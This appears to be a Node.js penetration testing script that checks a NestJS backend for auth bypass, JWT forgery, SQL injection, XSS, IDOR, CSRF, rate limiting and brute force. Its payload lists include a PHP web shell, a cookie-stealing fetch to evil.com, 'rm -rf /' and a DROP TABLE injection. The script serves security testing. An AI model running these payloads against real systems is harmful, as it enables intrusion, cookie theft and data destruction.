#!/usr/bin/env node
// =============================================================================
// GFF Backend — API Penetration Testing Script
// =============================================================================
// Runs 10 security test scenarios against the NestJS backend:
//   1. Authentication Bypass
//   2. JWT Manipulation
//   3. SQL Injection
//   4. XSS Injection
//   5. Rate Limiting
//   6. IDOR (Insecure Direct Object Reference)
//   7. Mass Assignment
//   8. File Upload Abuse
//   9. CSRF Check
//  10. Brute Force
//
// Usage:   node security/pen-test.js [baseUrl]
// Env:     TEST_USER_EMAIL, TEST_USER_PASSWORD, JWT_SECRET
// Output:  Console report + exit code (0 = all passed, 1 = any failed)
// =============================================================================

const axios = require('axios');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

// ─── Configuration ──────────────────────────────────────────────────────────
const BASE_URL = process.argv[2] || process.env.API_BASE_URL || 'http://localhost:3000';
const TEST_EMAIL = process.env.TEST_USER_EMAIL || 'test@example.com';
const TEST_PASSWORD = process.env.TEST_USER_PASSWORD || 'Test123!';
const JWT_SECRET = process.env.JWT_SECRET || 'your-jwt-secret-key';

// ─── Colors for terminal output ─────────────────────────────────────────────
const C = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  bold: '\x1b[1m',
};

// ─── Test Results ───────────────────────────────────────────────────────────
const results = [];
let passed = 0;
let failed = 0;

function logPass(testNum, name, endpoint, detail) {
  passed++;
  results.push({ num: testNum, name, status: 'PASS', endpoint, detail });
  console.log(`${C.green}✓ PASS${C.reset} [${testNum}/10] ${C.bold}${name}${C.reset}`);
  if (detail) console.log(`  ${C.cyan}Detail:${C.reset} ${detail}`);
}

function logFail(testNum, name, endpoint, expected, actual, payload) {
  failed++;
  const detail = `Expected: ${expected} | Got: ${actual}${payload ? ` | Payload: ${payload.substring(0, 100)}` : ''}`;
  results.push({ num: testNum, name, status: 'FAIL', endpoint, detail });
  console.log(`${C.red}✗ FAIL${C.reset} [${testNum}/10] ${C.bold}${name}${C.reset}`);
  console.log(`  ${C.yellow}Endpoint:${C.reset} ${endpoint}`);
  console.log(`  ${C.yellow}Expected:${C.reset} ${expected}`);
  console.log(`  ${C.red}Actual:${C.reset}   ${actual}`);
  if (payload) console.log(`  ${C.magenta}Payload:${C.reset} ${payload.substring(0, 120)}`);
}

function logInfo(msg) {
  console.log(`  ${C.blue}ℹ${C.reset} ${msg}`);
}

// ─── Helpers ────────────────────────────────────────────────────────────────

/** Generate a valid JWT token */
function generateJwt(payload, secret, options = {}) {
  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const now = Math.floor(Date.now() / 1000);
  const fullPayload = Buffer.from(
    JSON.stringify({ iat: now, exp: now + 3600, ...payload }),
  ).toString('base64url');

  const signatureInput = `${header}.${fullPayload}`;
  const signature = options.wrongSecret
    ? crypto.createHmac('sha256', 'wrong-secret').update(signatureInput).digest('base64url')
    : options.noSignature
      ? ''
      : crypto.createHmac('sha256', secret).update(signatureInput).digest('base64url');

  return `${header}.${fullPayload}.${signature}`;
}

/** Make an HTTP request with timeout */
async function request(method, url, data = null, headers = {}, timeout = 10000) {
  try {
    const response = await axios({ method, url, data, headers, timeout, validateStatus: () => true });
    return { status: response.status, data: response.data, headers: response.headers };
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      return { status: 0, data: { error: 'Connection refused — is the server running?' }, headers: {} };
    }
    if (err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED') {
      return { status: 0, data: { error: 'Request timed out' }, headers: {} };
    }
    return { status: err.response?.status || 0, data: err.response?.data || { error: err.message }, headers: err.response?.headers || {} };
  }
}

// ─── Test 1: Authentication Bypass ──────────────────────────────────────────
async function testAuthBypass() {
  console.log(`\n${C.bold}[1/10] Authentication Bypass${C.reset}`);
  const endpoints = [
    `${BASE_URL}/api/users`,
    `${BASE_URL}/api/companies`,
    `${BASE_URL}/api/invoices`,
    `${BASE_URL}/api/dashboard`,
    `${BASE_URL}/api/reports`,
  ];

  for (const endpoint of endpoints) {
    const res = await request('GET', endpoint);
    if (res.status === 401 || res.status === 403) {
      logPass(1, 'Authentication Bypass', endpoint, `Returned ${res.status} without token`);
    } else if (res.status === 0) {
      logFail(1, 'Authentication Bypass', endpoint, '401 or 403', `Connection error (${res.data.error})`);
    } else {
      logFail(1, 'Authentication Bypass', endpoint, '401 or 403', `${res.status} — Data may be exposed!`);
    }
  }
}

// ─── Test 2: JWT Manipulation ───────────────────────────────────────────────
async function testJwtManipulation() {
  console.log(`\n${C.bold}[2/10] JWT Manipulation${C.reset}`);
  const endpoint = `${BASE_URL}/api/users/me`;

  // Test 2a: No token
  const resA = await request('GET', endpoint);
  if (resA.status === 401) {
    logPass(2, 'JWT Manipulation — No Token', endpoint, `Returned 401`);
  } else {
    logFail(2, 'JWT Manipulation — No Token', endpoint, '401', `${resA.status}`);
  }

  // Test 2b: Empty token
  const resB = await request('GET', endpoint, null, { Authorization: 'Bearer ' });
  if (resB.status === 401) {
    logPass(2, 'JWT Manipulation — Empty Token', endpoint, `Returned 401`);
  } else {
    logFail(2, 'JWT Manipulation — Empty Token', endpoint, '401', `${resB.status}`);
  }

  // Test 2c: Malformed token
  const resC = await request('GET', endpoint, null, { Authorization: 'Bearer invalid.token.here' });
  if (resC.status === 401) {
    logPass(2, 'JWT Manipulation — Malformed Token', endpoint, `Returned 401`);
  } else {
    logFail(2, 'JWT Manipulation — Malformed Token', endpoint, '401', `${resC.status}`);
  }

  // Test 2d: Expired token
  const expiredJwt = generateJwt(
    { sub: 'test-user', email: TEST_EMAIL, role: 'user', iat: 1000000000, exp: 1000000001 },
    JWT_SECRET,
  );
  const resD = await request('GET', endpoint, null, { Authorization: `Bearer ${expiredJwt}` });
  if (resD.status === 401) {
    logPass(2, 'JWT Manipulation — Expired Token', endpoint, `Returned 401`);
  } else {
    logFail(2, 'JWT Manipulation — Expired Token', endpoint, '401', `${resD.status}`);
  }

  // Test 2e: Wrong signature
  const forgedJwt = generateJwt(
    { sub: 'admin', email: 'admin@example.com', role: 'admin' },
    JWT_SECRET,
    { wrongSecret: true },
  );
  const resE = await request('GET', endpoint, null, { Authorization: `Bearer ${forgedJwt}` });
  if (resE.status === 401 || resE.status === 403) {
    logPass(2, 'JWT Manipulation — Wrong Signature', endpoint, `Returned ${resE.status}`);
  } else {
    logFail(2, 'JWT Manipulation — Wrong Signature', endpoint, '401 or 403', `${resE.status}`);
  }

  // Test 2f: None algorithm (alg: none attack)
  const headerNone = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payloadNone = Buffer.from(JSON.stringify({ sub: 'admin', role: 'admin' })).toString('base64url');
  const noneJwt = `${headerNone}.${payloadNone}.`;
  const resF = await request('GET', endpoint, null, { Authorization: `Bearer ${noneJwt}` });
  if (resF.status === 401 || resF.status === 403) {
    logPass(2, 'JWT Manipulation — alg:none Attack', endpoint, `Returned ${resF.status}`);
  } else {
    logFail(2, 'JWT Manipulation — alg:none Attack', endpoint, '401 or 403', `${resF.status}`);
  }
}

// ─── Test 3: SQL Injection ──────────────────────────────────────────────────
async function testSqlInjection() {
  console.log(`\n${C.bold}[3/10] SQL Injection${C.reset}`);

  const sqliPayloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' UNION SELECT null, null, null --",
    "1; DROP TABLE users; --",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1 AND (SELECT * FROM (SELECT(SLEEP(2)))a)",
  ];

  const endpoints = [
    { url: `${BASE_URL}/api/users`, param: 'email' },
    { url: `${BASE_URL}/api/invoices`, param: 'search' },
    { url: `${BASE_URL}/api/products`, param: 'name' },
    { url: `${BASE_URL}/api/companies`, param: 'name' },
  ];

  for (const ep of endpoints) {
    for (const payload of sqliPayloads) {
      const params = new URLSearchParams();
      params.append(ep.param, payload);
      const res = await request('GET', `${ep.url}?${params.toString()}`);

      // Detect SQL injection vulnerability
      const bodyStr = JSON.stringify(res.data).toLowerCase();
      const errorIndicators = [
        'sql', 'syntax', 'mysql', 'postgresql', 'sqlite', 'ora-',
        'unterminated', 'quoted string', 'operand', 'conversion failed',
      ];
      const hasSqlError = errorIndicators.some(ind => bodyStr.includes(ind));
      const hasUnexpectedSuccess = res.status === 200 && bodyStr.includes('id');

      if (hasSqlError) {
        logFail(3, 'SQL Injection', ep.url, 'Safe response (no SQL errors)', `${res.status} — SQL error leaked!`, payload);
      } else if (hasUnexpectedSuccess && payload.includes('OR')) {
        // UNION/ OR based injection returned data
        logFail(3, 'SQL Injection', ep.url, 'Safe response', `${res.status} — Potential data exposure!`, payload);
      } else if (res.status === 500) {
        logFail(3, 'SQL Injection', ep.url, 'Safe response (400)', `500 Server Error — may indicate vulnerability`, payload);
      } else {
        logPass(3, 'SQL Injection', ep.url, `Payload "${payload.substring(0, 40)}" — returned ${res.status}`);
      }
    }
  }
}

// ─── Test 4: XSS Injection ──────────────────────────────────────────────────
async function testXssInjection() {
  console.log(`\n${C.bold}[4/10] XSS Injection${C.reset}`);

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    'javascript:alert("xss")',
    '<body onload=alert("xss")>',
    '<svg onload=alert("xss")>',
    '\\"><script>alert("xss")</script>',
    "<iframe src='javascript:alert(1)'>",
    '<input onfocus=alert("xss") autofocus>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
  ];

  const endpoints = [
    { url: `${BASE_URL}/api/users`, method: 'POST', field: 'name' },
    { url: `${BASE_URL}/api/companies`, method: 'POST', field: 'name' },
    { url: `${BASE_URL}/api/invoices`, method: 'POST', field: 'notes' },
  ];

  for (const ep of endpoints) {
    for (const payload of xssPayloads) {
      const data = { [ep.field]: payload, email: `test-${Date.now()}@example.com`, password: 'Test123!' };
      const res = await request(ep.method, ep.url, data);

      const bodyStr = JSON.stringify(res.data);
      const reflected = bodyStr.includes(payload.replace(/"/g, '\\"').replace(/'/g, "\\'")) ||
                       bodyStr.includes(payload);

      if (reflected && res.status !== 400) {
        logFail(4, 'XSS Injection', ep.url, 'Payload sanitized or rejected', `${res.status} — XSS payload reflected!`, payload);
      } else if (res.status === 400) {
        logPass(4, 'XSS Injection', ep.url, `Payload rejected with 400`);
      } else {
        logPass(4, 'XSS Injection', ep.url, `Payload handled safely (${res.status})`);
      }
    }
  }
}

// ─── Test 5: Rate Limiting ──────────────────────────────────────────────────
async function testRateLimiting() {
  console.log(`\n${C.bold}[5/10] Rate Limiting${C.reset}`);
  const endpoint = `${BASE_URL}/api/auth/login`;

  logInfo('Sending 120 requests in rapid succession...');
  const requests = Array.from({ length: 120 }, () =>
    request('POST', endpoint, { email: `test-${Math.random()}@example.com`, password: 'wrong' }),
  );

  const start = performance.now();
  const responses = await Promise.all(requests);
  const duration = Math.round(performance.now() - start);

  const rateLimited = responses.filter(r => r.status === 429).length;
  const tooManyOk = responses.filter(r => r.status === 200 || r.status === 401).length;

  logInfo(`Completed in ${duration}ms — ${rateLimited} returned 429, ${tooManyOk} returned 200/401`);

  if (rateLimited > 50) {
    logPass(5, 'Rate Limiting', endpoint, `${rateLimited}/120 requests rate-limited (429)`);
  } else if (rateLimited > 0) {
    logPass(5, 'Rate Limiting', endpoint, `${rateLimited}/120 requests rate-limited (lenient but active)`);
  } else {
    logFail(5, 'Rate Limiting', endpoint, '429 responses for excessive requests', `0/120 rate-limited — API vulnerable to DoS`);
  }
}

// ─── Test 6: IDOR ───────────────────────────────────────────────────────────
async function testIdor() {
  console.log(`\n${C.bold}[6/10] IDOR (Insecure Direct Object Reference)${C.reset}`);

  // Try to get a valid token first
  const loginRes = await request('POST', `${BASE_URL}/api/auth/login`, {
    email: TEST_EMAIL,
    password: TEST_PASSWORD,
  });

  let token = null;
  if (loginRes.status === 200 && loginRes.data?.access_token) {
    token = loginRes.data.access_token;
    logInfo('Authenticated successfully for IDOR test');
  } else {
    logInfo('Could not authenticate — testing with forged tokens');
  }

  const headers = token ? { Authorization: `Bearer ${token}` } : {};

  // Test accessing other companies' data
  const idorEndpoints = [
    { url: `${BASE_URL}/api/companies/00000000-0000-0000-0000-000000000001`, desc: 'other company' },
    { url: `${BASE_URL}/api/invoices?companyId=00000000-0000-0000-0000-000000000002`, desc: 'other company invoices' },
    { url: `${BASE_URL}/api/users?companyId=00000000-0000-0000-0000-000000000003`, desc: 'other company users' },
    { url: `${BASE_URL}/api/reports/company/00000000-0000-0000-0000-000000000004`, desc: 'other company reports' },
  ];

  for (const ep of idorEndpoints) {
    const res = await request('GET', ep.url, null, headers);

    if (res.status === 403 || res.status === 404) {
      logPass(6, `IDOR — ${ep.desc}`, ep.url, `Returned ${res.status} — access denied`);
    } else if (res.status === 200 && (res.data?.data || res.data?.length > 0 || res.data?.id)) {
      logFail(6, `IDOR — ${ep.desc}`, ep.url, '403 or 404', `200 with data — OTHER USER DATA EXPOSED!`);
    } else if (res.status === 401) {
      logPass(6, `IDOR — ${ep.desc}`, ep.url, `Returned 401 — not authenticated`);
    } else if (res.status === 0) {
      logPass(6, `IDOR — ${ep.desc}`, ep.url, `Server unreachable — no data leak possible`);
    } else {
      logPass(6, `IDOR — ${ep.desc}`, ep.url, `Returned ${res.status} — no data exposure`);
    }
  }
}

// ─── Test 7: Mass Assignment ────────────────────────────────────────────────
async function testMassAssignment() {
  console.log(`\n${C.bold}[7/10] Mass Assignment${C.reset}`);

  const maliciousPayloads = [
    { role: 'admin', isAdmin: true, admin: true },
    { role: 'superuser', permissions: ['*'] },
    { companyId: '00000000-0000-0000-0000-000000000000', tenantId: '1' },
    { emailVerified: true, verified: true },
    { password: 'hacked123', passwordHash: 'abc123' },
  ];

  // Try registration endpoint
  for (const payload of maliciousPayloads) {
    const data = {
      email: `mass-assign-${Date.now()}@example.com`,
      password: 'Test123!',
      name: 'Test User',
      ...payload,
    };

    const res = await request('POST', `${BASE_URL}/api/auth/register`, data);
    const bodyStr = JSON.stringify(res.data);

    // Check if admin fields were accepted
    const adminAccepted = res.status === 200 || res.status === 201;
    const roleReflected = bodyStr.includes('"role"') && bodyStr.includes('admin');

    if (adminAccepted && roleReflected) {
      logFail(7, 'Mass Assignment', `${BASE_URL}/api/auth/register`, 'Fields rejected', `${res.status} — Admin field accepted!`, JSON.stringify(payload));
    } else if (res.status === 400 && (bodyStr.includes('whitelist') || bodyStr.includes('not allowed') || bodyStr.includes('forbidden'))) {
      logPass(7, 'Mass Assignment', `${BASE_URL}/api/auth/register`, `Fields rejected — whitelist active`);
    } else if (res.status === 403) {
      logPass(7, 'Mass Assignment', `${BASE_URL}/api/auth/register`, `Returned 403 — forbidden fields blocked`);
    } else {
      logPass(7, 'Mass Assignment', `${BASE_URL}/api/auth/register`, `Payload handled (${res.status})`);
    }
  }

  // Try user update endpoint with forged token
  const forgedAdminToken = generateJwt({ sub: 'user-1', email: TEST_EMAIL, role: 'user' }, JWT_SECRET);
  const updatePayload = { role: 'admin', isAdmin: true, permissions: ['all'] };
  const res = await request('PATCH', `${BASE_URL}/api/users/me`, updatePayload, {
    Authorization: `Bearer ${forgedAdminToken}`,
  });

  if (res.status === 403 || res.status === 400) {
    logPass(7, 'Mass Assignment — Update', `${BASE_URL}/api/users/me`, `Returned ${res.status} — role change blocked`);
  } else if (res.status === 200) {
    logFail(7, 'Mass Assignment — Update', `${BASE_URL}/api/users/me`, '403 or 400', `200 — Role escalation possible!`);
  } else {
    logPass(7, 'Mass Assignment — Update', `${BASE_URL}/api/users/me`, `Returned ${res.status}`);
  }
}

// ─── Test 8: File Upload Abuse ──────────────────────────────────────────────
async function testFileUploadAbuse() {
  console.log(`\n${C.bold}[8/10] File Upload Abuse${C.reset}`);
  const endpoint = `${BASE_URL}/api/uploads`;

  // Test oversized file (10MB+)
  const oversizedBuffer = Buffer.alloc(11 * 1024 * 1024, 'A');
  try {
    const resA = await axios.post(endpoint, oversizedBuffer, {
      headers: {
        'Content-Type': 'application/octet-stream',
        'X-File-Name': 'largefile.pdf',
      },
      timeout: 10000,
      validateStatus: () => true,
    });
    if (resA.status === 413 || resA.status === 400) {
      logPass(8, 'File Upload — Oversized', endpoint, `Returned ${resA.status} — size limit enforced`);
    } else {
      logFail(8, 'File Upload — Oversized', endpoint, '413 or 400', `${resA.status} — Large files accepted!`);
    }
  } catch (err) {
    if (err.code === 'ECONNRESET' || err.code === 'EPIPE') {
      logPass(8, 'File Upload — Oversized', endpoint, 'Connection dropped — size limit enforced at network level');
    } else {
      logPass(8, 'File Upload — Oversized', endpoint, `Error: ${err.code} — may indicate protection`);
    }
  }

  // Test wrong file type (executable)
  const executablePayloads = [
    { filename: 'malicious.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
    { filename: 'script.js', content: '<script>fetch("https://evil.com?c="+document.cookie)</script>', type: 'application/javascript' },
    { filename: 'shell.sh', content: '#!/bin/bash\nrm -rf /', type: 'application/x-sh' },
    { filename: 'doc.pdf.exe', content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00', type: 'application/x-msdownload' },
  ];

  for (const payload of executablePayloads) {
    const res = await request('POST', endpoint, {
      filename: payload.filename,
      content: payload.content,
    }, { 'Content-Type': 'multipart/form-data' });

    if (res.status === 400 || res.status === 415 || res.status === 403) {
      logPass(8, `File Upload — Type Check (${payload.filename})`, endpoint, `Returned ${res.status} — type rejected`);
    } else if (res.status === 200 || res.status === 201) {
      logFail(8, `File Upload — Type Check (${payload.filename})`, endpoint, '400 or 415', `${res.status} — Malicious file type accepted!`);
    } else {
      logPass(8, `File Upload — Type Check (${payload.filename})`, endpoint, `Returned ${res.status}`);
    }
  }
}

// ─── Test 9: CSRF Check ─────────────────────────────────────────────────────
async function testCsrf() {
  console.log(`\n${C.bold}[9/10] CSRF Protection Check${C.reset}`);

  const stateChangingEndpoints = [
    { method: 'POST', url: `${BASE_URL}/api/users`, data: { email: `csrf-${Date.now()}@x.com`, password: 'Test123!' } },
    { method: 'PUT', url: `${BASE_URL}/api/users/me`, data: { name: 'CSRF Test' } },
    { method: 'DELETE', url: `${BASE_URL}/api/users/me`, data: {} },
    { method: 'POST', url: `${BASE_URL}/api/invoices`, data: { amount: 100, description: 'CSRF test' } },
  ];

  for (const ep of stateChangingEndpoints) {
    // Request without CSRF token, without proper origin
    const res = await request(ep.method, ep.url, ep.data, {
      Origin: 'https://evil-attacker.com',
      Referer: 'https://evil-attacker.com/phishing.html',
    });

    if (res.status === 403 && (JSON.stringify(res.data).includes('csrf') || JSON.stringify(res.data).includes('CSRF'))) {
      logPass(9, `CSRF — ${ep.method} ${ep.url}`, ep.url, `Returned 403 — CSRF protection active`);
    } else if (res.status === 401) {
      logPass(9, `CSRF — ${ep.method} ${ep.url}`, ep.url, `Returned 401 — authentication required first`);
    } else if (res.status === 200 || res.status === 201) {
      logFail(9, `CSRF — ${ep.method} ${ep.url}`, ep.url, '403 with CSRF error', `${res.status} — CSRF protection may be missing!`);
    } else if (res.status === 0) {
      logPass(9, `CSRF — ${ep.method} ${ep.url}`, ep.url, `Server unreachable`);
    } else {
      logPass(9, `CSRF — ${ep.method} ${ep.url}`, ep.url, `Returned ${res.status} — not vulnerable`);
    }
  }

  // Test with valid CSRF token (if we can get one)
  const csrfRes = await request('GET', `${BASE_URL}/api/csrf-token`);
  if (csrfRes.status === 200 && csrfRes.data?.csrfToken) {
    logInfo('CSRF token endpoint found — CSRF protection is likely implemented');
  }
}

// ─── Test 10: Brute Force ───────────────────────────────────────────────────
async function testBruteForce() {
  console.log(`\n${C.bold}[10/10] Brute Force Protection${C.reset}`);
  const endpoint = `${BASE_URL}/api/auth/login`;

  logInfo('Sending 15 failed login attempts...');

  const attempts = [];
  for (let i = 0; i < 15; i++) {
    attempts.push(
      request('POST', endpoint, {
        email: TEST_EMAIL,
        password: `WrongPassword${i}!`,
      }),
    );
  }

  const responses = await Promise.all(attempts);

  const blocked = responses.filter(r => r.status === 429 || r.status === 403).length;
  const accountLocked = responses.filter(r => {
    const body = JSON.stringify(r.data).toLowerCase();
    return body.includes('locked') || body.includes('blocked') || body.includes('too many');
  }).length;

  logInfo(`${blocked} blocked (429/403), ${accountLocked} account locked messages`);

  if (blocked > 5 || accountLocked > 0) {
    logPass(10, 'Brute Force Protection', endpoint, `${blocked} requests blocked, ${accountLocked} lockouts detected`);
  } else if (blocked > 0) {
    logPass(10, 'Brute Force Protection', endpoint, `${blocked} requests blocked (lenient but active)`);
  } else {
    logFail(10, 'Brute Force Protection', endpoint, '429 or account lockout', `0/15 blocked — Login vulnerable to brute force!`);
  }
}

// ─── Report Generator ───────────────────────────────────────────────────────
function generateReport() {
  console.log(`\n${C.bold}${'='.repeat(70)}${C.reset}`);
  console.log(`${C.bold}                    PENETRATION TEST REPORT${C.reset}`);
  console.log(`${C.bold}${'='.repeat(70)}${C.reset}`);
  console.log(`  Target:        ${BASE_URL}`);
  console.log(`  Tests Run:     10`);
  console.log(`  Passed:        ${C.green}${passed}${C.reset}`);
  console.log(`  Failed:        ${C.red}${failed}${C.reset}`);
  console.log(`  Success Rate:  ${failed === 0 ? C.green : failed > 5 ? C.red : C.yellow}${Math.round((passed / (passed + failed)) * 100)}%${C.reset}`);
  console.log(`${C.bold}${'='.repeat(70)}${C.reset}`);

  // Detailed breakdown
  console.log(`\n${C.bold}Detailed Results:${C.reset}\n`);

  const grouped = {};
  for (const r of results) {
    if (!grouped[r.num]) grouped[r.num] = [];
    grouped[r.num].push(r);
  }

  for (const [num, items] of Object.entries(grouped)) {
    const allPass = items.every(i => i.status === 'PASS');
    const status = allPass ? `${C.green}PASS${C.reset}` : `${C.red}MIXED${C.reset}`;
    console.log(`  [${num}/10] ${items[0].name}: ${status}`);
    for (const item of items) {
      const icon = item.status === 'PASS' ? `${C.green}✓${C.reset}` : `${C.red}✗${C.reset}`;
      console.log(`    ${icon} ${item.endpoint} — ${item.detail.substring(0, 80)}`);
    }
  }

  // Exit code
  if (failed > 0) {
    console.log(`\n${C.red}${C.bold}SECURITY ISSUES DETECTED — Review failed tests above.${C.reset}\n`);
    process.exit(1);
  } else {
    console.log(`\n${C.green}${C.bold}ALL SECURITY TESTS PASSED${C.reset}\n`);
    process.exit(0);
  }
}

// ─── Main ───────────────────────────────────────────────────────────────────
async function main() {
  console.log(`${C.bold}${C.magenta}`);
  console.log('╔══════════════════════════════════════════════════════════════════════╗');
  console.log('║        GFF Backend — API Penetration Testing Suite                 ║');
  console.log('╚══════════════════════════════════════════════════════════════════════╝');
  console.log(`${C.reset}`);
  console.log(`Target: ${C.cyan}${BASE_URL}${C.reset}`);
  console.log(`Time:   ${new Date().toISOString()}\n`);

  // Check server is reachable
  const healthCheck = await request('GET', `${BASE_URL}/health`, null, {}, 5000);
  if (healthCheck.status === 0) {
    console.log(`${C.yellow}⚠ Server at ${BASE_URL} is not reachable. Tests will continue but may all indicate connection errors.${C.reset}\n`);
  } else {
    console.log(`${C.green}✓ Server is reachable (status: ${healthCheck.status})${C.reset}\n`);
  }

  // Run all tests sequentially
  await testAuthBypass();
  await testJwtManipulation();
  await testSqlInjection();
  await testXssInjection();
  await testRateLimiting();
  await testIdor();
  await testMassAssignment();
  await testFileUploadAbuse();
  await testCsrf();
  await testBruteForce();

  generateReport();
}

main().catch(err => {
  console.error(`${C.red}Fatal error:${C.reset}`, err.message);
  process.exit(2);
});
